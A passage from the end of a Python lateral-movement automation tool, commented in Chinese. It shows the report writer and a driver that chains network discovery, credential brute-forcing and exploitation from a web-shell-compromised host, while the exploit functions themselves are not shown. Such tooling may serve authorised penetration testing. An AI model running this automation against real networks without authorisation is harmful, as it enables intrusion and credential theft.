    async def generate_horizontal_movement_report(self) -> str:
        """生成横向移动报告"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"horizontal_movement_report_{timestamp}.txt"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80)
                f.write("\n横向移动自动化分析报告")
                f.write("\n" + "=" * 80)
                f.write(f"\n分析时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                f.write("\n")

                # 网络发现统计
                if self.network_discovery_results:
                    f.write("\n【网络发现统计】")
                    f.write(f"\n总主机数: {len(self.network_discovery_results)}")
                    reachable_hosts = [h for h in self.network_discovery_results if h.reachable]
                    f.write(f"\n可达主机数: {len(reachable_hosts)}")

                    os_distribution = {}
                    for host in reachable_hosts:
                        os_distribution[host.os_info] = os_distribution.get(host.os_info, 0) + 1

                    f.write(f"\n操作系统分布:")
                    for os_type, count in os_distribution.items():
                        f.write(f"\n  {os_type}: {count}")

                # 凭据破解统计
                if self.credential_results:
                    f.write("\n\n【凭据破解统计】")
                    f.write(f"\n总尝试次数: {len(self.credential_results)}")
                    successful_creds = [c for c in self.credential_results if c.success]
                    f.write(f"\n成功破解: {len(successful_creds)}")
                    f.write(f"\n成功率: {len(successful_creds)/len(self.credential_results)*100:.1f}%")

                    access_level_dist = {}
                    for cred in successful_creds:
                        access_level_dist[cred.access_level] = access_level_dist.get(cred.access_level, 0) + 1

                    f.write(f"\n访问级别分布:")
                    for level, count in access_level_dist.items():
                        f.write(f"\n  {level}: {count}")

                # 利用结果统计
                if self.exploit_results:
                    f.write("\n\n【利用结果统计】")
                    f.write(f"\n总利用次数: {len(self.exploit_results)}")
                    successful_exploits = [e for e in self.exploit_results if e.success]
                    f.write(f"\n成功利用: {len(successful_exploits)}")
                    f.write(f"\n成功率: {len(successful_exploits)/len(self.exploit_results)*100:.1f}%")

                    vuln_type_dist = {}
                    for exploit in successful_exploits:
                        vuln_type_dist[exploit.vulnerability_type] = vuln_type_dist.get(exploit.vulnerability_type, 0) + 1

                    f.write(f"\n漏洞类型分布:")
                    for vuln_type, count in vuln_type_dist.items():
                        f.write(f"\n  {vuln_type}: {count}")

                    # 详细利用结果
                    f.write("\n\n【详细利用结果】")
                    for exploit in successful_exploits[:5]:  # 显示前5个成功利用
                        f.write(f"\n\n目标: {exploit.target_host}")
                        f.write(f"\n漏洞类型: {exploit.vulnerability_type}")
                        f.write(f"\n利用方法: {exploit.method_used}")
                        f.write(f"\n执行时间: {exploit.execution_time:.2f}秒")
                        f.write(f"\n风险等级: {exploit.risk_level}")

                        f.write(f"\n提取的数据:")
                        for key, value in exploit.data_extracted.items():
                            f.write(f"\n  {key}: {value}")

                        f.write(f"\n横向移动路径: {' -> '.join(exploit.lateral_movement_path)}")

                # 建议和总结
                f.write("\n\n【建议总结】")
                f.write("\n1. 优先修补高权限访问漏洞（RDP、SMB、管理员命令执行）")
                f.write("\n2. 实施强密码策略和多因素认证")
                f.write("\n3. 限制内网访问权限和网络隔离")
                f.write("\n4. 部署网络监控和入侵检测系统")
                f.write("\n5. 定期进行内网安全评估和渗透测试")
                f.write("\n6. 建立应急响应计划和业务连续性方案")
                f.write("\n7. 加强员工安全意识培训")
                f.write("\n8. 实施端点保护和设备管理")

            logger.info(f"横向移动报告已保存: {filename}")
            return filename

        except Exception as e:
            logger.error(f"生成报告失败: {e}")
            return ""

    async def run_horizontal_movement_automation(self, initial_host: Dict[str, Any]) -> Dict[str, Any]:
        """运行横向移动自动化"""
        try:
            # 设置初始被攻陷主机
            await self.setup_initial_compromised_host(initial_host)

            # 1. 网络发现
            logger.info("第一步：网络发现")
            active_hosts = await self.discover_network_range()

            # 2. 服务枚举
            logger.info("第二步：服务枚举")
            network_hosts = await self.enumerate_network_services(active_hosts)

            # 3. 凭据破解
            logger.info("第三步：凭据破解")
            credentials = await self.brute_force_credentials(network_hosts)

            # 4. 横向移动利用
            logger.info("第四步：横向移动利用")
            exploit_results = await self.lateral_movement_exploitation(network_hosts, credentials)

            # 5. 生成报告
            logger.info("第五步：生成报告")
            report_file = await self.generate_horizontal_movement_report()

            # 返回结果汇总
            return {
                "initial_host": initial_host,
                "network_hosts": len([h for h in network_hosts if h.reachable]),
                "credentials_found": len([c for c in credentials if c.success]),
                "exploits_success": len([e for e in exploit_results if e.success]),
                "total_exploits": len(exploit_results),
                "report_file": report_file,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"横向移动自动化失败: {e}")
            return {"error": str(e)}

def main():
    """主函数"""
    print("启动横向移动自动化工具...")

    # 创建自动化器
    automator = HorizontalMovementAutomator()

    # 测试初始被攻陷主机
    initial_host = {
        "ip": "192.168.1.100",
        "hostname": "compromised-server",
        "port": 80,
        "vulnerability": "Web Shell",
        "access_level": "medium"
    }

    print(f"初始被攻陷主机: {initial_host['ip']}:{initial_host['port']}")
    print("\n开始横向移动自动化...")

    # 运行自动化
    result = asyncio.run(automator.run_horizontal_movement_automation(initial_host))

    print("\n" + "=" * 80)
    print("横向移动自动化完成!")
    print("=" * 80)
    print(f"初始主机: {result.get('initial_host', {}).get('ip', 'Unknown')}")
    print(f"发现主机: {result.get('network_hosts', 0)} 个")
    print(f"成功凭据: {result.get('credentials_found', 0)} 个")
    print(f"成功利用: {result.get('exploits_success', 0)}/{result.get('total_exploits', 0)}")
    print(f"报告文件: {result.get('report_file', 'N/A')}")
    print("=" * 80)

if __name__ == "__main__":
    main()